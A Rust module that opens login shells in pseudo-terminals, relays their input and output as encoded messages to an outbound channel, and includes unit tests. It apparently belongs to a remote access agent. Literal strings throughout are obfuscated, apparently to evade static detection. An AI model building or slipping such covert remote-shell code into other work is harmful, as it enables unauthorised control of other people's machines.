use std::{
    collections::HashMap,
    env,
    io::{Read, Write},
    sync::LazyLock,
    thread,
};

use anyhow::{Context, Result, anyhow, bail};
use portable_pty::{ChildKiller, CommandBuilder, MasterPty, PtySize, native_pty_system};
use tokio::sync::mpsc::Sender;

use crate::obfstr;
use crate::protocol::{self, ConsoleOutput};

const DEFAULT_COLS: u16 = 120;
const DEFAULT_ROWS: u16 = 36;
const MAX_DIMENSION: u16 = 1_000;
static CONSOLE_OUTPUT: LazyLock<String> = LazyLock::new(|| obfstr!("console_output"));

struct ConsoleSession {
    master: Box<dyn MasterPty + Send>,
    writer: Box<dyn Write + Send>,
    killer: Box<dyn ChildKiller + Send + Sync>,
}

pub struct ConsoleHub {
    sessions: HashMap<String, ConsoleSession>,
    outbound: Sender<Vec<u8>>,
}

impl ConsoleHub {
    pub fn new(outbound: Sender<Vec<u8>>) -> Self {
        Self {
            sessions: HashMap::new(),
            outbound,
        }
    }

    pub fn start(&mut self, session_id: &str, cols: i64, rows: i64) -> Result<()> {
        validate_session_id(session_id)?;
        self.stop(session_id);

        let size = terminal_size(cols, rows);
        let pair = native_pty_system().openpty(size).context("open terminal")?;
        let mut command = shell_command();
        command.env(obfstr!("TERM"), obfstr!("xterm-256color"));
        let child = pair
            .slave
            .spawn_command(command)
            .context("start terminal shell")?;
        drop(pair.slave);

        let reader = pair
            .master
            .try_clone_reader()
            .context("open terminal output")?;
        let writer = pair.master.take_writer().context("open terminal input")?;
        let killer = child.clone_killer();

        spawn_output_forwarder(session_id.to_owned(), reader, child, self.outbound.clone());
        self.sessions.insert(
            session_id.to_owned(),
            ConsoleSession {
                master: pair.master,
                writer,
                killer,
            },
        );
        Ok(())
    }

    pub fn write(&mut self, session_id: &str, data: &str) -> Result<()> {
        let session = self
            .sessions
            .get_mut(session_id)
            .ok_or_else(|| anyhow!("console session not found"))?;
        session
            .writer
            .write_all(data.as_bytes())
            .context("write terminal input")?;
        session.writer.flush().context("flush terminal input")
    }

    pub fn resize(&self, session_id: &str, cols: i64, rows: i64) -> Result<()> {
        let session = self
            .sessions
            .get(session_id)
            .ok_or_else(|| anyhow!("console session not found"))?;
        session
            .master
            .resize(terminal_size(cols, rows))
            .context("resize terminal")
    }

    pub fn stop(&mut self, session_id: &str) {
        if let Some(mut session) = self.sessions.remove(session_id) {
            let _ = session.killer.kill();
        }
    }

    pub fn stop_all(&mut self) {
        for (_, mut session) in self.sessions.drain() {
            let _ = session.killer.kill();
        }
    }
}

impl Drop for ConsoleHub {
    fn drop(&mut self) {
        self.stop_all();
    }
}

fn spawn_output_forwarder(
    session_id: String,
    mut reader: Box<dyn Read + Send>,
    mut child: Box<dyn portable_pty::Child + Send + Sync>,
    outbound: Sender<Vec<u8>>,
) {
    thread::spawn(move || {
        let mut buffer = [0u8; 4096];
        loop {
            match reader.read(&mut buffer) {
                Ok(0) => break,
                Ok(size) => send_output(&outbound, &session_id, Some(&buffer[..size]), None, None),
                Err(error) => {
                    send_output(&outbound, &session_id, None, None, Some(&error.to_string()));
                    break;
                }
            }
        }

        match child.wait() {
            Ok(status) => send_output(
                &outbound,
                &session_id,
                None,
                Some(i32::try_from(status.exit_code()).unwrap_or(i32::MAX)),
                None,
            ),
            Err(error) => send_output(&outbound, &session_id, None, None, Some(&error.to_string())),
        }
    });
}

fn send_output(
    outbound: &Sender<Vec<u8>>,
    session_id: &str,
    data: Option<&[u8]>,
    exit_code: Option<i32>,
    error: Option<&str>,
) {
    let message = ConsoleOutput {
        message_type: CONSOLE_OUTPUT.as_str(),
        session_id,
        data: data.map(serde_bytes::Bytes::new),
        exit_code,
        error,
    };
    if let Ok(encoded) = protocol::encode(&message) {
        let _ = outbound.blocking_send(encoded);
    }
}

fn shell_command() -> CommandBuilder {
    if cfg!(windows) {
        return CommandBuilder::new(
            env::var_os(obfstr!("COMSPEC")).unwrap_or_else(|| obfstr!("cmd.exe").into()),
        );
    }

    let shell = env::var_os(obfstr!("SHELL")).unwrap_or_else(|| {
        if cfg!(target_os = "macos") {
            obfstr!("/bin/zsh").into()
        } else {
            obfstr!("/bin/bash").into()
        }
    });
    let mut command = CommandBuilder::new(shell);
    command.arg(obfstr!("-l"));
    command
}

fn validate_session_id(session_id: &str) -> Result<()> {
    if session_id.is_empty() {
        bail!("missing console session id");
    }
    if session_id.len() > 128 {
        bail!("console session id is too long");
    }
    Ok(())
}

fn terminal_size(cols: i64, rows: i64) -> PtySize {
    PtySize {
        cols: dimension(cols, DEFAULT_COLS),
        rows: dimension(rows, DEFAULT_ROWS),
        pixel_width: 0,
        pixel_height: 0,
    }
}

fn dimension(value: i64, default: u16) -> u16 {
    if value <= 0 {
        default
    } else {
        u16::try_from(value)
            .unwrap_or(MAX_DIMENSION)
            .min(MAX_DIMENSION)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    #[test]
    fn terminal_dimensions_are_defaulted_and_bounded() {
        assert_eq!(
            terminal_size(0, -1),
            PtySize {
                cols: 120,
                rows: 36,
                pixel_width: 0,
                pixel_height: 0
            }
        );
        assert_eq!(terminal_size(2_000, 50).cols, 1_000);
        assert_eq!(terminal_size(80, 50).rows, 50);
    }

    #[test]
    fn session_ids_are_required_and_bounded() {
        assert!(validate_session_id("").is_err());
        assert!(validate_session_id(&"x".repeat(129)).is_err());
        assert!(validate_session_id("console-1").is_ok());
    }

    #[test]
    fn terminal_streams_command_output() {
        let (tx, mut rx) = tokio::sync::mpsc::channel(64);
        let mut hub = ConsoleHub::new(tx);
        hub.start("smoke", 80, 24).unwrap();
        let input = if cfg!(windows) {
            "\x1b[1;1Recho overlord-lite-tty\r\nexit\r\n"
        } else {
            "echo overlord-lite-tty\nexit\n"
        };
        hub.write("smoke", input).unwrap();

        let deadline = Instant::now() + Duration::from_secs(10);
        let mut output = Vec::new();
        while Instant::now() < deadline {
            match rx.try_recv() {
                Ok(message) => {
                    let decoded = protocol::decode(&message).unwrap();
                    if let Some(rmpv::Value::Binary(data)) = protocol::field(&decoded, "data") {
                        output.extend_from_slice(data);
                        if String::from_utf8_lossy(&output).contains("overlord-lite-tty") {
                            break;
                        }
                    }
                    if protocol::integer_field(&decoded, "exitCode").is_some() {
                        break;
                    }
                }
                Err(tokio::sync::mpsc::error::TryRecvError::Empty) => {
                    thread::sleep(Duration::from_millis(10));
                }
                Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => break,
            }
        }

        hub.stop_all();
        assert!(
            String::from_utf8_lossy(&output).contains("overlord-lite-tty"),
            "terminal output did not contain the marker: {:?}",
            String::from_utf8_lossy(&output)
        );
    }
}
